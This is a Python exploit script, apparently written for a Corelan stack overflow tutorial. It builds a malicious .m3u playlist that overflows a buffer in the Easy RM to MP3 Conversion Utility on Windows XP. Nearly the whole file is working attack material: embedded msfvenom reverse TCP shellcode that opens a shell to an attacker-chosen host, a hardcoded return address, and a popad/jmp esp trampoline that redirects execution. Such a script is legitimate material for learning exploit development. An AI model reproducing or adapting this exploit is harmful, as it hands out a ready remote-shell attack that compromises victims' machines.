#!/usr/bin/env python
#
# Script Name   : easy-rm-sploit6.py
# Tutorial Link : https://www.corelan.be (Part 2 Stack Based Overflows)
# Req Modules   : None standard
# Author        : wetw0rk
# Target OS     : Windows XP
# Version       : 1.0
# Python Ver.   : 2.7
# Description   : Simply an exploit that takes advantage of a stack
#                 buffer overflow in the Easy RM to MP3 Conversion Utility
#                 in the popad technique.
#

import struct

# msfvenom -p windows/shell/reverse_tcp LHOST=X LPORT=X
# -b "\x00\x09\x0a" --smallest -f python --smallest
buf =  ""
buf += "\x6a\x47\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
buf += "\x0c\xdb\xfe\x16\x83\xeb\xfc\xe2\xf4\xf0\x33\x7c\x16"
buf += "\x0c\xdb\x9e\x9f\xe9\xea\x3e\x72\x87\x8b\xce\x9d\x5e"
buf += "\xd7\x75\x44\x18\x50\x8c\x3e\x03\x6c\xb4\x30\x3d\x24"
buf += "\x52\x2a\x6d\xa7\xfc\x3a\x2c\x1a\x31\x1b\x0d\x1c\x1c"
buf += "\xe4\x5e\x8c\x75\x44\x1c\x50\xb4\x2a\x87\x97\xef\x6e"
buf += "\xef\x93\xff\xc7\x5d\x50\xa7\x36\x0d\x08\x75\x5f\x14"
buf += "\x38\xc4\x5f\x87\xef\x75\x17\xda\xea\x01\xba\xcd\x14"
buf += "\xf3\x17\xcb\xe3\x1e\x63\xfa\xd8\x83\xee\x37\xa6\xda"
buf += "\x63\xe8\x83\x75\x4e\x28\xda\x2d\x70\x87\xd7\xb5\x9d"
buf += "\x54\xc7\xff\xc5\x87\xdf\x75\x17\xdc\x52\xba\x32\x28"
buf += "\x80\xa5\x77\x55\x81\xaf\xe9\xec\x84\xa1\x4c\x87\xc9"
buf += "\x15\x9b\x51\xb3\xcd\x24\x0c\xdb\x96\x61\x7f\xe9\xa1"
buf += "\x42\x64\x97\x89\x30\x0b\x24\x2b\xae\x9c\xda\xfe\x16"
buf += "\x25\x1f\xaa\x46\x64\xf2\x7e\x7d\x0c\x24\x2b\x7c\x09"
buf += "\xb3\x3e\xbe\x84\x78\x96\x14\x0c\xdb\xff\x9f\xea\x8b"
buf += "\xae\x46\x5c\x9b\xae\x56\x5c\xb3\x14\x19\xd3\x3b\x01"
buf += "\xc3\x9b\xb1\xee\x40\x5b\xb3\x67\xb3\x78\xba\x01\xc3"
buf += "\x89\x1b\x8a\x1a\xf3\x95\xf6\x63\xe0\xb3\x0e\xa3\xae"
buf += "\x8d\x01\xc3\x66\xdb\x94\x12\x5a\x8c\x96\x14\xd5\x13"
buf += "\xa1\xe9\xd9\x50\xc8\x7c\x4c\xb3\xfe\x06\x0c\xdb\xa8"
buf += "\x7c\x0c\xb3\xa6\xb2\x5f\x3e\x01\xc3\x9f\x88\x94\x16"
buf += "\x5a\x88\xa9\x7e\x0e\x02\x36\x49\xf3\x0e\xff\xd5\x25"
buf += "\x1d\x8b\xf8\xcf\xdb\xfe\x16"

buffer_size = 26073				# bytes needed before EIP address overwrite
file = "ROFL.m3u"                               # file we will be creating

junk = "A"*250					# junk to send first
nops = "\x90"*50				# 50 nops after junk

rest_of_buffer = "A"*(buffer_size - (len(junk)+ len(nops)+len(buf)))	# append to nops to = 26073

eip = struct.pack('<L', 0x77246FA1)		# little endian ret addr

preshellcode = "X"*4				# pretend only space available
preshellcode += "\x61"*9			# 9 popads
preshellcode += "\xff\xe4"			# 10th and 11th byte, jmp esp
preshellcode += "\x90\x90"			# fill the rest with some nops

garbage = "\x44"*100				# garbage need to jump over

first_buffer = junk + nops + buf + rest_of_buffer		# first buffer proir to EIP overwrites
print "[*] size of initial buffer: %d" % len(first_buffer)
complete_buffer = first_buffer + eip + preshellcode + garbage	# complete buffer to be sent
print "[*] writing %d bytes to m3u file" % (len(complete_buffer))
open_file = open(file, 'w')					# open file in write mode
open_file.write(complete_buffer)				# write junk to file
open_file.close()						# close file
print "[*] m3u file saved to %s" % (file)
